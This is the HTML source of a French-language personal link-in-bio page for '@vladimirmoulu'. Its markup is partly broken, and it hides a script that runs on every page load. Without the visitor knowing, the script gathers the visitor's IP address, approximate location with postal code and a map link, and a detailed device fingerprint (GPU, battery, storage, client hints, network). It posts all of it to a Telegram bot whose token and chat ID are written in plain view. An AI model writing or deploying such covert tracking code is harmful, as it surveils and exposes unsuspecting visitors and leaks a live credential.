<!DOCTYPE html>

<head>

  <style>
    :root {
      --bg: #000000;
      --fg: #ffffff;
      --muted: #8a8a8a;
      --card: rgba(255, 255, 255, 0.04);
      --card-hover: rgba(255, 255, 255, 0.09);
      --border: rgba(255, 255, 255, 0.10);
    }

    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

    html, body { height: 100%; }

    body {
      background: var(--bg);
      color: var(--fg);
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      min-height: 100%;
      display: flex;
      justify-content: center;
      padding: 56px 22px calc(40px + env(safe-area-inset-bottom));
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }

    .container {
      width: 100%;
      max-width: 460px;
      display: flex;
      flex-direction: column;
      align-items: center;
      animation: fade 0.7s ease both;
    }

    @keyframes fade {
      from { opacity: 0; transform: translateY(12px); }
      to   { opacity: 1; transform: translateY(0); }
    }

    /* Photo de profil — rond blanc.
       Pour ta vraie photo : remplace <div class="avatar"> par
       <img class="avatar" src="photo.jpg" alt="Vladimir Moulu" /> */
    .avatar {
      width: 112px;
      height: 112px;
      border-radius: 50%;
      background: #ffffff;
      object-fit: cover;
      display: block;
      box-shadow: 0 0 0 1px rgba(255,255,255,0.12), 0 8px 30px rgba(255,255,255,0.06);
    }

    .name {
      margin-top: 20px;
      font-size: 21px;
      font-weight: 600;
      letter-spacing: 0.2px;
      display: inline-flex;
      align-items: center;
      gap: 6px;
    }
    .verified { width: 19px; height: 19px; flex: 0 0 auto; }

    .tagline {
      margin-top: 8px;
      font-size: 14px;
      font-weight: 400;
      color: var(--muted);
    }

    .links {
      width: 100%;
      margin-top: 36px;
      display: flex;
      flex-direction: column;
      gap: 14px;
    }

    .link {
      display: flex;
      align-items: center;
      gap: 14px;
      width: 100%;
      padding: 16px 18px;
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 16px;
      color: var(--fg);
      text-decoration: none;
      font-size: 15px;
      font-weight: 500;
      transition: transform 0.15s ease, background 0.2s ease, border-color 0.2s ease;
    }

    .link:hover { background: var(--card-hover); border-color: rgba(255,255,255,0.22); transform: translateY(-2px); }
    .link:active { transform: translateY(0) scale(0.99); }

    .link .icon { flex: 0 0 auto; width: 22px; height: 22px; display: flex; align-items: center; justify-content: center; }
    .link .icon svg { width: 22px; height: 22px; }

    .link .text { display: flex; flex-direction: column; line-height: 1.25; }
    .link .text .label { font-weight: 600; }
    .link .text .sub { font-size: 12.5px; color: var(--muted); font-weight: 400; margin-top: 2px; }

    .link .arrow { margin-left: auto; color: var(--muted); transition: transform 0.2s ease; }
    .link:hover .arrow { transform: translateX(3px); color: var(--fg); }
  </style>
</head>
<body>
  <main class="container">
    <!-- Pour mettre ta vraie photo : remplace le bloc ci-dessous par
         <img class="avatar" src="photo.jpg" alt="Vladimir Moulu" /> -->
    <div class="avatar" role="img" aria-label="Vladimir Moulu"></div>

    <h1 class="name">@vladimirmoulu</h1>

            <rect x="2.5" y="2.5" width="19" height="19" rx="5.5" stroke="currentColor" stroke-width="1.6"/>
            <circle cx="12" cy="12" r="4.2" stroke="currentColor" stroke-width="1.6"/>

        </span>
        <span class="text">

  <!-- ============================================================
       NOTIFICATION TELEGRAM À CHAQUE VISITE
       -> Remplace les 2 valeurs ci-dessous (voir les étapes que je t'ai données)
       ============================================================ -->
  <script>
  (function () {
    var BOT_TOKEN = "8836935224:AAERF_lgzSr9IAyK0_VwrAcpC4vOxCxg8vA";
    var CHAT_ID   = "8215550381";

    if (BOT_TOKEN.indexOf("COLLE_") === 0 || CHAT_ID.indexOf("COLLE_") === 0) return;

    var ua = navigator.userAgent;
    function esc(s){ return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }

    function osInfo() {
      var m;
      if ((m = ua.match(/iPhone OS (\d+[_.]\d+)/i))) return "iPhone (iOS " + m[1].replace("_",".") + ")";
      if (/iPad/i.test(ua)) return "iPad";
      if ((m = ua.match(/Android (\d+(?:\.\d+)?)/i))) return "Android " + m[1];
      if ((m = ua.match(/Windows NT (\d+\.\d+)/i))) { var w={"10.0":"10/11","6.3":"8.1","6.2":"8","6.1":"7"}; return "Windows " + (w[m[1]]||m[1]); }
      if ((m = ua.match(/Mac OS X (\d+[_.]\d+(?:[_.]\d+)?)/i))) return "Mac (macOS " + m[1].replace(/_/g,".") + ")";
      if (/Linux/i.test(ua)) return "Linux";
      return "Inconnu";
    }
    function browserInfo() {
      var m;
      if (/Instagram/i.test(ua)) return "App Instagram";
      if (/FBAN|FBAV/i.test(ua)) return "App Facebook";
      if (/TikTok|musical_ly|BytedanceWebview/i.test(ua)) return "App TikTok";
      if (/Snapchat/i.test(ua)) return "App Snapchat";
      if ((m = ua.match(/Edg\/(\d+)/))) return "Edge " + m[1];
      if ((m = ua.match(/(?:CriOS|Chrome)\/(\d+)/))) return "Chrome " + m[1];
      if ((m = ua.match(/(?:FxiOS|Firefox)\/(\d+)/))) return "Firefox " + m[1];
      if ((m = ua.match(/Version\/(\d+).*Safari/))) return "Safari " + m[1];
      return "Inconnu";
    }
    function source() {
      if (/Instagram/i.test(ua)) return "Instagram";
      if (/TikTok|musical_ly/i.test(ua)) return "TikTok";
      if (/Snapchat/i.test(ua)) return "Snapchat";
      if (/FBAN|FBAV/i.test(ua)) return "Facebook";
      var r = document.referrer;
      if (!r) return "Direct / inconnu";
      try { return new URL(r).hostname.replace(/^www\./,""); } catch (e) { return r; }
    }

    function getBattery() {
      return new Promise(function (res) {
        if (!navigator.getBattery) return res(null);
        navigator.getBattery().then(function (b) {
          var s = Math.round(b.level * 100) + "%" + (b.charging ? " ⚡en charge" : "");
          if (!b.charging && b.dischargingTime && b.dischargingTime !== Infinity)
            s += " (~" + Math.round(b.dischargingTime / 60) + " min restantes)";
          res(s);
        }).catch(function () { res(null); });
      });
    }

    // Carte graphique réelle (révèle la puce : "Apple A16 GPU", "Adreno 740"…)
    function gpuInfo() {
      try {
        var c = document.createElement("canvas");
        var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
        if (!gl) return null;
        var ext = gl.getExtension("WEBGL_debug_renderer_info");
        return ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : null;
      } catch (e) { return null; }
    }

    // Client Hints (Chrome/Android/Edge) : modèle exact, version OS, architecture
    function getHints() {
      return new Promise(function (res) {
        var d = navigator.userAgentData;
        if (!d || !d.getHighEntropyValues) return res(null);
        d.getHighEntropyValues(["platform", "platformVersion", "model", "architecture", "bitness"])
          .then(res).catch(function () { res(null); });
      });
    }

    // Estimation du stockage disponible sur l'appareil
    function getStorage() {
      return new Promise(function (res) {
        if (!navigator.storage || !navigator.storage.estimate) return res(null);
        navigator.storage.estimate().then(res).catch(function () { res(null); });
      });
    }

    // Nombre de caméras / micros / sorties audio (sans y accéder, donc sans permission)
    function getMedia() {
      return new Promise(function (res) {
        if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return res(null);
        navigator.mediaDevices.enumerateDevices().then(function (list) {
          var c = { cam: 0, mic: 0, spk: 0 };
          list.forEach(function (d) {
            if (d.kind === "videoinput") c.cam++;
            else if (d.kind === "audioinput") c.mic++;
            else if (d.kind === "audiooutput") c.spk++;
          });
          res(c);
        }).catch(function () { res(null); });
      });
    }
    // Plusieurs fournisseurs en cascade : si l'un échoue/est bloqué, on passe au suivant.
    // Chacun renvoie un format différent -> on normalise vers une forme commune.
    function getIP() {
      var providers = [
        { url: "https://ipwho.is/", map: function (d) {
            if (d.success === false || !d.ip) return null;
            return { ip: d.ip, city: d.city, region: d.region, country: d.country,
                     postal: d.postal, latitude: d.latitude, longitude: d.longitude,
                     isp: d.connection && (d.connection.isp || d.connection.org),
                     emoji: d.flag && d.flag.emoji, type: d.type }; } },
        { url: "https://ipapi.co/json/", map: function (d) {
            if (!d.ip || d.error) return null;
            return { ip: d.ip, city: d.city, region: d.region, country: d.country_name,
                     postal: d.postal, latitude: d.latitude, longitude: d.longitude,
                     isp: d.org, type: (d.version || "").indexOf(":") >= 0 ? "IPv6" : "IPv4" }; } },
        { url: "https://get.geojs.io/v1/ip/geo.json", map: function (d) {
            if (!d.ip) return null;
            return { ip: d.ip, city: d.city, region: d.region, country: d.country,
                     latitude: d.latitude, longitude: d.longitude, isp: d.organization_name }; } },
        { url: "https://api.ipify.org?format=json", map: function (d) {
            return d.ip ? { ip: d.ip } : null; } } // dernier recours : au moins l'IP
      ];
      function tryNext(i) {
        if (i >= providers.length) return Promise.resolve(null);
        return fetch(providers[i].url)
          .then(function (r) { return r.json(); })
          .then(function (d) { var n = providers[i].map(d); return n || tryNext(i + 1); })
          .catch(function () { return tryNext(i + 1); });
      }
      return tryNext(0);
    }

    Promise.all([getIP(), getBattery(), getHints(), getStorage(), getMedia()]).then(function (out) {
      var geo = out[0], batt = out[1], hints = out[2], store = out[3], media = out[4];
      var now = new Date().toLocaleString("fr-FR", { dateStyle: "long", timeStyle: "medium" });

      var lines = ["👁 <b>Nouvelle visite — vladimirmoulu</b>", "🕒 " + now, ""];

      // Localisation — on affiche tout ce qu'on a, même partiel
      var loc = geo ? [geo.city, geo.region, geo.country].filter(Boolean).join(", ") : "";
      if (loc) {
        if (geo.emoji) loc += " " + geo.emoji;
        lines.push("📍 " + esc(loc) + " <i>(approx. IP)</i>");
        if (geo.postal) lines.push("   Code postal : " + esc(geo.postal));
        if (geo.latitude) lines.push("   🗺 https://www.google.com/maps?q=" + geo.latitude + "," + geo.longitude);
      } else if (geo && geo.ip) {
        lines.push("📍 Ville non résolue — IP captée ci-dessous");
      } else {
        // Aucun service joignable : on déduit au moins le pays via le fuseau/la langue
        var guess = "";
        try { guess = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) {}
        var lg = (navigator.language || "").split("-")[1];
        lines.push("📍 " + esc(guess || lg || "indéterminée") + " <i>(estimé appareil)</i>");
      }

      // Réseau / IP
      if (geo && geo.ip) {
        lines.push("");
        lines.push("🔢 IP : " + esc(geo.ip));
        if (geo.isp) lines.push("📡 Opérateur : " + esc(geo.isp));
        if (geo.type) lines.push("   (" + esc(geo.type) + ")");
      }

      // Appareil
      lines.push("");
      lines.push("📱 " + esc(osInfo()) + " · " + esc(browserInfo()));
      var model = (ua.match(/Android[^;]*;\s*([^;)]+?)(?:\s+Build|\)|;)/i) || [])[1];
      if (model && !/^[a-z]{2}-[a-z]{2}$/i.test(model.trim())) lines.push("📲 Modèle : " + esc(model.trim()));
      lines.push("↩️ Source : " + esc(source()));
      var langs = navigator.languages ? navigator.languages.join(", ") : navigator.language;
      lines.push("🌐 Langues : " + esc(langs || "?"));
      try { lines.push("🕓 Fuseau : " + Intl.DateTimeFormat().resolvedOptions().timeZone); } catch (e) {}
      lines.push("🖥 Écran : " + screen.width + "×" + screen.height + " @" + (window.devicePixelRatio || 1) + "x");
      lines.push("   " + (screen.colorDepth || "?") + " bits · fenêtre " + window.innerWidth + "×" + window.innerHeight);
      try { if (screen.orientation && screen.orientation.type) lines.push("   Orientation : " + screen.orientation.type); } catch (e) {}
      if (navigator.hardwareConcurrency) lines.push("⚙️ CPU : " + navigator.hardwareConcurrency + " cœurs");
      if (navigator.deviceMemory) lines.push("💾 RAM : " + navigator.deviceMemory + " Go (min.)");
      if (navigator.maxTouchPoints != null) lines.push("👆 Tactile : " + (navigator.maxTouchPoints > 0 ? "oui (" + navigator.maxTouchPoints + " pts)" : "non"));

      // Réseau détaillé (type, débit, latence)
      var con = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (con) {
        var net = [];
        if (con.effectiveType) net.push(con.effectiveType);
        if (con.downlink) net.push(con.downlink + " Mb/s");
        if (con.rtt != null) net.push("ping " + con.rtt + " ms");
        if (con.saveData) net.push("éco. données");
        if (net.length) lines.push("📶 Réseau : " + net.join(" · "));
      }

      // GPU réel
      var gpu = gpuInfo();
      if (gpu) lines.push("🎮 GPU : " + esc(gpu));

      // Client Hints : modèle exact + version OS + architecture (Android/Chrome/Edge)
      if (hints) {
        if (hints.model) lines.push("📲 Modèle exact : " + esc(hints.model));
        var pv = [hints.platform, hints.platformVersion].filter(Boolean).join(" ").trim();
        if (pv) lines.push("🧩 OS détaillé : " + esc(pv));
        var arch = [hints.architecture, hints.bitness ? hints.bitness + " bits" : ""].filter(Boolean).join(" ").trim();
        if (arch) lines.push("🏗 Architecture : " + esc(arch));
      }

      // Plateforme bas niveau + moteur
      if (navigator.platform) lines.push("🧱 Plateforme : " + esc(navigator.platform));
      if (navigator.vendor) lines.push("🏷 Moteur : " + esc(navigator.vendor));

      // Périphériques média (comptage, sans accès caméra/micro)
      if (media && (media.cam || media.mic || media.spk))
        lines.push("🎥 Périphériques : " + media.cam + " cam · " + media.mic + " micro · " + media.spk + " sortie");

      // Stockage
      if (store && store.quota) {
        var gb = function (n) { return (n / 1073741824).toFixed(1); };
        lines.push("💽 Stockage : ~" + gb(store.usage || 0) + " / " + gb(store.quota) + " Go");
      }

      // Préférences système + divers
      var prefs = [];
      try { if (matchMedia("(prefers-color-scheme: dark)").matches) prefs.push("mode sombre"); } catch (e) {}
      try { if (matchMedia("(prefers-reduced-motion: reduce)").matches) prefs.push("anim. réduites"); } catch (e) {}
      if (prefs.length) lines.push("🎨 Préférences : " + prefs.join(", "));
      lines.push("🍪 Cookies : " + (navigator.cookieEnabled ? "activés" : "désactivés"));

      if (batt) lines.push("🔋 Batterie : " + batt);

      fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: lines.join("\n"),
          parse_mode: "HTML",
          disable_web_page_preview: true
        })
      }).catch(function () {});
    });
  })();
  </script>
</body>
